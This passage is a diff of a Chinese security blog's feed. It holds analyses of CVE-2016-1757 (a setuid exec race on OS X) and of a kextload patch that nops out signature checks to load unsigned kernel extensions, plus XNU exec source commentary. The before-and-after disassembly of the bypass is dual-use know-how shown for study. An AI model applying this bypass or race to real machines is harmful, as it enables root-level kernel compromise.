+    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>​    分析<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757</a>的EXP过程中，发现EXP通过对kextload程序的patch，绕过了<code>OSX</code>对驱动扩展数字签名的检测，成功加载未签名的驱动扩展。</p>
 <a id="more"></a>
 <h1 id="0x01_数字签名与内核扩展">0x01 数字签名与内核扩展</h1><p>​    <code>OSX</code>系统在加载内核扩展时要求必须拥有苹果的开发者签名。在开发过程中，在自己的调试环境中可以通过修改参数加载没有签名的驱动，进行开发与调试。</p>
 <h2 id="1-1_OS_X_10-11之后版本">1.1 OS X 10.11之后版本</h2><p>​    在OS X 10.11中引入的Rootless机制之后只需要关闭Rootless机制就可以加载没有签名的驱动扩展。细节可以参考这一篇文章。<a href="http://tadaland.com/os-x-rootless.html" target="_blank" rel="external">OS X 10.11中Rootless的实现与解释以及关闭方法</a></p>
@@ -345,7 +345,7 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line">@function SecStaticCodeCheckValidity</span><br><span class="line">	Performs static validation on the given SecStaticCode object. The call obtains and</span><br><span class="line">	verifies the signature on the code object. It checks the validity of all</span><br><span class="line">	sealed components (including resources, if any). It validates the code against</span><br><span class="line">	a SecRequirement if one is given. The call succeeds if all these conditions</span><br><span class="line">	are satisfactory. It fails otherwise.</span><br><span class="line">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*蹩脚的翻译一下</span><br><span class="line">@function SecStaticCodeCheckValidity</span><br><span class="line">	认证传入的SecStaticCode对象的合法性，该函数调用获取并检测数字签名的合法性。</span><br><span class="line">	认证内容包含了所有的组件(如果存在资源文件同样会检测)。</span><br><span class="line">	如果提供了加密的内容，也会对加密部分进行认证。</span><br><span class="line">	当所有条件满足时函数调用返回成功。</span><br><span class="line">*/</span></span><br></pre></td></tr></table></figure>
 <p>这是该函数在头文件中的定义。</p>
 <h1 id="0x03_小结">0x03 小结</h1><p>​    经过测试确实可以绕过数字签名的检测成功加载了未签名的内核扩展。</p>
-<p>​    通过对<code>kextload</code>的<code>patch</code>，绕过两个检测函数，从而达到了绕过<code>OSX</code>系统对驱动扩展的签名检测，结合<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/" target="_blank" rel="external">CVE-2016-1757</a>的<code>root</code>权限执行任意代码，从而实现了，普通用户可以加载任意未签名的内核扩展。</p>
+<p>​    通过对<code>kextload</code>的<code>patch</code>，绕过两个检测函数，从而达到了绕过<code>OSX</code>系统对驱动扩展的签名检测，结合<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757</a>的<code>root</code>权限执行任意代码，从而实现了，普通用户可以加载任意未签名的内核扩展。</p>
 <h1 id="0x04_勘误">0x04 勘误</h1><p>​    由于不够严谨，遗漏了一个patch的点，这里补上。更详细的原理在<code>exploit</code>的分析文章中可以看到。</p>
 <h2 id="4-1_sub_1000023BC">4.1 sub_1000023BC</h2><p>在<code>sub_1000023BC</code>函数中的对sub_085c的调用被patch修改绕过签名验证。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__text:<span class="number">0000000100002802</span>                 mov     esi, <span class="number">1</span></span><br><span class="line">__text:<span class="number">0000000100002807</span>                 mov     rdi, r15</span><br><span class="line">__text:<span class="number">000000010000280</span>A                 mov     edx, r12d</span><br><span class="line">__text:<span class="number">000000010000280</span>D                 call    sub_10000085C</span><br><span class="line">__text:<span class="number">0000000100002812</span>                 test    eax, eax</span><br><span class="line">__text:<span class="number">0000000100002814</span>                 mov     r12, r14</span><br><span class="line">__text:<span class="number">0000000100002817</span>                 mov     r14, [rbp+var_CD0]</span><br><span class="line">__text:<span class="number">000000010000281</span>E                 jnz     loc_1000028FA</span><br></pre></td></tr></table></figure>
@@ -353,7 +353,7 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__text:<span class="number">000000010000277</span>E                 mov     r14, r12</span><br><span class="line">__text:<span class="number">0000000100002781</span>                 movzx   r12d, [rbp+var_CB9]</span><br><span class="line">__text:<span class="number">0000000100002789</span>                 mov     esi, <span class="number">1</span></span><br><span class="line">__text:<span class="number">000000010000278</span>E                 mov     rdi, r15</span><br><span class="line">__text:<span class="number">0000000100002791</span>                 mov     edx, r12d</span><br><span class="line">__text:<span class="number">0000000100002794</span>                 nop</span><br><span class="line">__text:<span class="number">0000000100002795</span>                 nop</span><br><span class="line">__text:<span class="number">0000000100002796</span>                 nop</span><br><span class="line">__text:<span class="number">0000000100002797</span>                 xor     eax, eax</span><br><span class="line">__text:<span class="number">0000000100002799</span>                 mov     ebx, eax</span><br><span class="line">__text:<span class="number">000000010000279</span>B                 test    ebx, ebx</span><br></pre></td></tr></table></figure>
 <p><code>bindiif</code>如下图所示:</p>
 <p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/patch_kextload/kanwu1.png" alt="勘误1"></p>
-<h1 id="ps:">ps:</h1><p>这是我的学习分享博客<a href="http://turingh.github.io/" target="_blank" rel="external">http://turingh.github.io/</a></p>
+<h1 id="ps:">ps:</h1><p>这是我的学习分享博客<a href="http://turingh.github.io/">http://turingh.github.io/</a></p>
 <p>欢迎大家来探讨，不足之处还请指正。</p>
 ]]></content>
     <summary type="html">
@@ -361,20 +361,20 @@
     
     </summary>
     
-      <category term="kernel" scheme="http://yoursite.com/tags/kernel/"/>
+      <category term="kernel" scheme="http://turingh.github.io/tags/kernel/"/>
     
-      <category term="kextload" scheme="http://yoursite.com/tags/kextload/"/>
+      <category term="kextload" scheme="http://turingh.github.io/tags/kextload/"/>
     
-      <category term="patch" scheme="http://yoursite.com/tags/patch/"/>
+      <category term="patch" scheme="http://turingh.github.io/tags/patch/"/>
     
-      <category term="OS X" scheme="http://yoursite.com/categories/OS-X/"/>
+      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[CVE-2016-1757简单分析]]></title>
-    <link href="http://yoursite.com/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
-    <id>http://yoursite.com/2016/04/03/CVE-2016-1757简单分析/</id>
+    <link href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
+    <id>http://turingh.github.io/2016/04/03/CVE-2016-1757简单分析/</id>
     <published>2016-04-03T17:49:24.000Z</published>
     <updated>2016-04-29T19:07:36.000Z</updated>
     <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><blockquote>
@@ -383,7 +383,7 @@
 </blockquote>
 <p>最近的10.11.4补丁修复了一个利用条件竞争获得代码执行权限的漏洞，经过对内核源码以及poc的理解之后，先对问题作出一个简单的分析。</p>
 <a id="more"></a>
-<h1 id="0x01_基础知识">0x01 基础知识</h1><h2 id="1-1_exec函数流程">1.1 exec函数流程</h2><p>我在<a href="http://turingh.github.io/2016/03/30/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/" target="_blank" rel="external">OSX内核加载mach-o流程分析</a>中比较详细的分析了<code>exec</code>整个执行流程中比较重要的几个函数，这个是比较精简的一个流程图。</p>
+<h1 id="0x01_基础知识">0x01 基础知识</h1><h2 id="1-1_exec函数流程">1.1 exec函数流程</h2><p>我在<a href="http://turingh.github.io/2016/03/30/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/">OSX内核加载mach-o流程分析</a>中比较详细的分析了<code>exec</code>整个执行流程中比较重要的几个函数，这个是比较精简的一个流程图。</p>
 <p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/f10c5443276635863d7ac7aea6fa2e6db76ce2c3/png/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B.png" alt="exec函数图"></p>
 <h1 id="1-2_mach_vm_*_API">1.2 mach_vm_* API</h1><p><code>Mach</code>提供了一种用户层对虚拟内存的操作方式。一系列对<code>vm_map_t</code>作出操作的<code>API</code>可以对虚拟内存作出很多操作。这里的<code>vm_map_t</code>就是<code>PORT</code>。</p>
 <p>这一系列的API有很多，这里只是简单的介绍一下POC中会使用到的API。</p>
@@ -402,8 +402,8 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_SEND		((mach_port_right_t) <span class="number">0</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_RECEIVE		((mach_port_right_t) <span class="number">1</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_SEND_ONCE	((mach_port_right_t) <span class="number">2</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_PORT_SET	((mach_port_right_t) <span class="number">3</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_DEAD_NAME	((mach_port_right_t) <span class="number">4</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_LABELH	        ((mach_port_right_t) <span class="number">5</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_NUMBER		((mach_port_right_t) <span class="number">6</span>)</span></span><br></pre></td></tr></table></figure>
 <p><code>Ports</code>可以在不同的<code>task</code>之间传递，通过传递可以赋予其他<code>task</code>对<code>ports</code>的操作权限。例如POC中使用的就是在父进程与子进程之间传递<code>Port</code>得到了对内存操作的权限。</p>
 <h1 id="0x02_漏洞原理">0x02 漏洞原理</h1><p>​    在内核处理setuid的程序时存在一个时间窗口，通过这个时间窗口，在进程<code>Port</code>被关闭之前，拥有进程<code>Port</code>的程序可以改写目标进程的任意内存，通过改写内存可以利用目标进程的root权限执行任意的shellcode。</p>
-<h2 id="2-1_execv流程漏洞">2.1 execv流程漏洞</h2><p><img src="https://2.bp.blogspot.com/-lw-AyicBVT0/VvGCDuX_AZI/AAAAAAAABRk/sjk9rPkkGhMsrNI6ZkVxNexTffskLBs0Q/s1600/2016-03-22_2.png" alt="流程图"><br><a href="http://turingh.github.io/2016/03/30/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#1-4_load_machfile" target="_blank" rel="external">load_machfile源码分析</a></p>
-<p><a href="http://turingh.github.io/2016/03/30/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#1-3_exec_mach_imgact" target="_blank" rel="external">exec_mach_imgact源码分析</a></p>
+<h2 id="2-1_execv流程漏洞">2.1 execv流程漏洞</h2><p><img src="https://2.bp.blogspot.com/-lw-AyicBVT0/VvGCDuX_AZI/AAAAAAAABRk/sjk9rPkkGhMsrNI6ZkVxNexTffskLBs0Q/s1600/2016-03-22_2.png" alt="流程图"><br><a href="http://turingh.github.io/2016/03/30/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#1-4_load_machfile">load_machfile源码分析</a></p>
+<p><a href="http://turingh.github.io/2016/03/30/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#1-3_exec_mach_imgact">exec_mach_imgact源码分析</a></p>
 <p>在swap_task_map以及exec_handle_suid之间有一个时间窗口，task port还是可以对内存做出修改的。</p>
 <p>具体细节可以参考poc，同时也可以参考源码的分析日志。</p>
 <h3 id="2-2_捕获时间窗口(灵犀一指)">2.2 捕获时间窗口(灵犀一指)</h3><p>​    时间窗口打开的时机对编写poc非常重要，因为在调用exec之后整个行为都是内核控制的，没有什么直接的办法获取时间窗口，poc中提供的方法是通过不断的调用<code>mach_vm_region</code>，当窗口出现时，也就是从old_map切换到new_map时，<code>mach_vm_region</code>函数获取的address应该是不同的。具体实现在下面的poc源码分析中会提到。</p>
@@ -438,7 +438,7 @@
 <li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=676&amp;redir=1" target="_blank" rel="external">Logic error when exec-ing suid binaries allows code execution as root on OS X/iOS</a></li>
 <li><a href="http://googleprojectzero.blogspot.com/2016/03/race-you-to-kernel.html" target="_blank" rel="external">Race you to the kernel!</a></li>
 </ol>
-<h1 id="ps">ps</h1><p>这是我的学习分享博客<a href="http://turingh.github.io/" target="_blank" rel="external">http://turingh.github.io/</a></p>
+<h1 id="ps">ps</h1><p>这是我的学习分享博客<a href="http://turingh.github.io/">http://turingh.github.io/</a></p>
 <p>欢迎大家来探讨，不足之处还请指正。</p>
 ]]></content>
     <summary type="html">
@@ -450,30 +450,30 @@
     
     </summary>
     
-      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
+      <category term="CVE" scheme="http://turingh.github.io/tags/CVE/"/>
     
-      <category term="execv" scheme="http://yoursite.com/tags/execv/"/>
+      <category term="execv" scheme="http://turingh.github.io/tags/execv/"/>
     
-      <category term="ports" scheme="http://yoursite.com/tags/ports/"/>
+      <category term="ports" scheme="http://turingh.github.io/tags/ports/"/>
     
-      <category term="race" scheme="http://yoursite.com/tags/race/"/>
+      <category term="race" scheme="http://turingh.github.io/tags/race/"/>
     
-      <category term="OS X" scheme="http://yoursite.com/categories/OS-X/"/>
+      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
     
-      <category term="CVE" scheme="http://yoursite.com/categories/OS-X/CVE/"/>
+      <category term="CVE" scheme="http://turingh.github.io/categories/OS-X/CVE/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[OSX内核加载mach-o流程分析]]></title>
-    <link href="http://yoursite.com/2016/03/30/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/"/>
-    <id>http://yoursite.com/2016/03/30/OSX内核加载mach-o流程分析/</id>
+    <link href="http://turingh.github.io/2016/03/30/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/"/>
+    <id>http://turingh.github.io/2016/03/30/OSX内核加载mach-o流程分析/</id>
     <published>2016-03-30T23:58:05.000Z</published>
     <updated>2016-03-31T15:39:14.000Z</updated>
     <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>​    研究<code>OS X</code>安全方面的知识需要对<code>mach-o</code>加载的流程需要有一个比较完整的理解，断断续续一个月的时间里面，通过对源码的阅读对<code>mach-o</code>的加载有一个比较基本的认识，在遇到各个具体的问题是才能更好的理解和操作。</p>
 <p>​    其他相关文章可以看这里，基本涵盖了从内核态到应用层的相关源码的简单分析。还有不足之处在遇到相关的问题时也会加到这一系列文章中。</p>
-<p>​    1.<a href="http://turingh.github.io/2016/03/01/dyld%E4%B8%ADmacho%E5%8A%A0%E8%BD%BD%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/" target="_blank" rel="external">mach-o加载流程学习-dyld对主image的处理流程</a></p>
-<p>​    2.<a href="http://turingh.github.io/2016/03/16/dyld%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90load/" target="_blank" rel="external">mach-o加载流程学习-dyld对依赖库的加载流程</a></p>
+<p>​    1.<a href="http://turingh.github.io/2016/03/01/dyld%E4%B8%ADmacho%E5%8A%A0%E8%BD%BD%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">mach-o加载流程学习-dyld对主image的处理流程</a></p>
+<p>​    2.<a href="http://turingh.github.io/2016/03/16/dyld%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90load/">mach-o加载流程学习-dyld对依赖库的加载流程</a></p>
 <p>​    3.mach-o加载流程学习-内核对mach-o文件的加载流程(本文)</p>
 <p>​    </p>
 <p>​    通过一张图片，可以比较清楚的理解整个流程。</p>
@@ -484,7 +484,7 @@
 <h2 id="1-2_exec_activate_image">1.2 exec_activate_image</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line"> * exec_activate_image</span><br><span class="line"> *</span><br><span class="line"> * Description:	Iterate through the available image activators, and activate</span><br><span class="line"> *		the image associated with the imgp structure.  We start with</span><br><span class="line"> *		the</span><br><span class="line"> *</span><br><span class="line"> * Parameters:	struct image_params *	Image parameter block</span><br><span class="line"> *</span><br><span class="line"> * Returns:	0			Success</span><br><span class="line"> *		EBADEXEC		The executable is corrupt/unknown</span><br><span class="line"> *	execargs_alloc:EINVAL		Invalid argument</span><br><span class="line"> *	execargs_alloc:EACCES		Permission denied</span><br><span class="line"> *	execargs_alloc:EINTR		Interrupted function</span><br><span class="line"> *	execargs_alloc:ENOMEM		Not enough space</span><br><span class="line"> *	exec_save_path:EFAULT		Bad address</span><br><span class="line"> *	exec_save_path:ENAMETOOLONG	Filename too long</span><br><span class="line"> *	exec_check_permissions:EACCES	Permission denied</span><br><span class="line"> *	exec_check_permissions:ENOEXEC	Executable file format error</span><br><span class="line"> *	exec_check_permissions:ETXTBSY	Text file busy [misuse of error code]</span><br><span class="line"> *	exec_check_permissions:???</span><br><span class="line"> *	namei:???</span><br><span class="line"> *	vn_rdwr:???			[anything vn_rdwr can return]</span><br><span class="line"> *	&lt;ex_imgact&gt;:???			[anything an imgact can return]</span><br><span class="line"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line"><span class="title">exec_activate_image</span><span class="params">(<span class="keyword">struct</span> image_params *imgp)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">struct</span> nameidata *ndp = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *excpath;</span><br><span class="line">	<span class="keyword">int</span> error;</span><br><span class="line">	<span class="keyword">int</span> resid;</span><br><span class="line">	<span class="keyword">int</span> once = <span class="number">1</span>;	<span class="comment">/* save SGUID-ness for interpreted files */</span></span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> itercount = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">proc_t</span> p = vfs_context_proc(imgp-&gt;ip_vfs_context);</span><br><span class="line"></span><br><span class="line">	error = execargs_alloc(imgp);</span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">goto</span> bad_notrans;</span><br><span class="line">	</span><br><span class="line">	error = exec_save_path(imgp, imgp-&gt;ip_user_fname, imgp-&gt;ip_seg, &amp;excpath);</span><br><span class="line">	<span class="keyword">if</span> (error) &#123;</span><br><span class="line">		<span class="keyword">goto</span> bad_notrans;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Use excpath, which contains the copyin-ed exec path */</span></span><br><span class="line">	DTRACE_PROC1(exec, <span class="keyword">uintptr_t</span>, excpath);</span><br><span class="line"></span><br><span class="line">	MALLOC(ndp, <span class="keyword">struct</span> nameidata *, <span class="keyword">sizeof</span>(*ndp), M_TEMP, M_WAITOK | M_ZERO);</span><br><span class="line">	<span class="keyword">if</span> (ndp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		error = ENOMEM;</span><br><span class="line">		<span class="keyword">goto</span> bad_notrans;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	NDINIT(ndp, LOOKUP, OP_LOOKUP, FOLLOW | LOCKLEAF | AUDITVNPATH1,</span><br><span class="line">		   UIO_SYSSPACE, CAST_USER_ADDR_T(excpath), imgp-&gt;ip_vfs_context);</span><br><span class="line"></span><br><span class="line">again:</span><br><span class="line">	error = namei(ndp); <span class="comment">//<span class="doctag">todo:</span>	详细流程先不看，研究下来感觉是路径的搜索</span></span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">goto</span> bad_notrans;</span><br><span class="line">	imgp-&gt;ip_ndp = ndp;	<span class="comment">/* successful namei(); call nameidone() later */</span></span><br><span class="line">	imgp-&gt;ip_vp = ndp-&gt;ni_vp;	<span class="comment">/* if set, need to vnode_put() at some point */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * Before we start the transition from binary A to binary B, make</span><br><span class="line">	 * sure another thread hasn't started exiting the process.  We grab</span><br><span class="line">	 * the proc lock to check p_lflag initially, and the transition</span><br><span class="line">	 * mechanism ensures that the value doesn't change after we release</span><br><span class="line">	 * the lock.</span><br><span class="line">	 */</span></span><br><span class="line">	proc_lock(p);</span><br><span class="line">	<span class="keyword">if</span> (p-&gt;p_lflag &amp; P_LEXIT) &#123;</span><br><span class="line">		proc_unlock(p);</span><br><span class="line">		<span class="keyword">goto</span> bad_notrans;</span><br><span class="line">	&#125;</span><br><span class="line">	error = proc_transstart(p, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">	proc_unlock(p);</span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">goto</span> bad_notrans;</span><br><span class="line"></span><br><span class="line">	error = exec_check_permissions(imgp);</span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Copy; avoid invocation of an interpreter overwriting the original */</span></span><br><span class="line">	<span class="keyword">if</span> (once) &#123;</span><br><span class="line">		once = <span class="number">0</span>;</span><br><span class="line">		*imgp-&gt;ip_origvattr = *imgp-&gt;ip_vattr;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//读取数据到内存中</span></span><br><span class="line">	error = vn_rdwr(UIO_READ, imgp-&gt;ip_vp, imgp-&gt;ip_vdata, PAGE_SIZE, <span class="number">0</span>,</span><br><span class="line">			UIO_SYSSPACE, IO_NODELOCKED,</span><br><span class="line">			vfs_context_ucred(imgp-&gt;ip_vfs_context),</span><br><span class="line">			&amp;resid, vfs_context_proc(imgp-&gt;ip_vfs_context));</span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (resid) &#123;</span><br><span class="line">		<span class="built_in">memset</span>(imgp-&gt;ip_vdata + (PAGE_SIZE - resid), <span class="number">0x0</span>, resid);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">  	<span class="comment">//到这里之前的代码主要做了两件事情</span></span><br><span class="line">  	<span class="comment">//1.根据路径查找文件</span></span><br><span class="line">  	<span class="comment">//2.将文件拷贝到内存中</span></span><br><span class="line">encapsulated_binary:</span><br><span class="line">	<span class="comment">/* Limit the number of iterations we will attempt on each binary */</span></span><br><span class="line">	<span class="keyword">if</span> (++itercount &gt; EAI_ITERLIMIT) &#123;</span><br><span class="line">		error = EBADEXEC;</span><br><span class="line">		<span class="keyword">goto</span> bad;</span><br><span class="line">	&#125;</span><br><span class="line">	error = -<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; error == -<span class="number">1</span> &amp;&amp; execsw[i].ex_imgact != <span class="literal">NULL</span>; i++) &#123;</span><br><span class="line">		<span class="comment">//这里对macho文件进行了解析</span></span><br><span class="line">		error = (*execsw[i].ex_imgact)(imgp);	<span class="comment">//<span class="doctag">todo:</span>调用了一个指针函数，exec_mach_imgact</span></span><br><span class="line">      	<span class="comment">//总共有三种函数</span></span><br><span class="line">      	<span class="comment">/*</span><br><span class="line">        struct execsw &#123;</span><br><span class="line">		int (*ex_imgact)(struct image_params *);</span><br><span class="line">		const char *ex_name;</span><br><span class="line">		&#125; execsw[] = &#123;</span><br><span class="line">		&#123; exec_mach_imgact,		"Mach-o Binary" &#125;,</span><br><span class="line">		&#123; exec_fat_imgact,		"Fat Binary" &#125;,</span><br><span class="line">		&#123; exec_shell_imgact,		"Interpreter Script" &#125;,</span><br><span class="line">		&#123; NULL, NULL&#125;</span><br><span class="line">&#125;;</span><br><span class="line">*/</span></span><br><span class="line">      	<span class="comment">//分别是osx支持的三种不同的可执行文件</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span> (error) &#123;</span><br><span class="line">            <span class="comment">/*出错处理*/</span></span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * Call out to allow 3rd party notification of exec. </span><br><span class="line">	 * Ignore result of kauth_authorize_fileop call.</span><br><span class="line">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (error == <span class="number">0</span> &amp;&amp; kauth_authorize_fileop_has_listeners()) &#123;</span><br><span class="line">		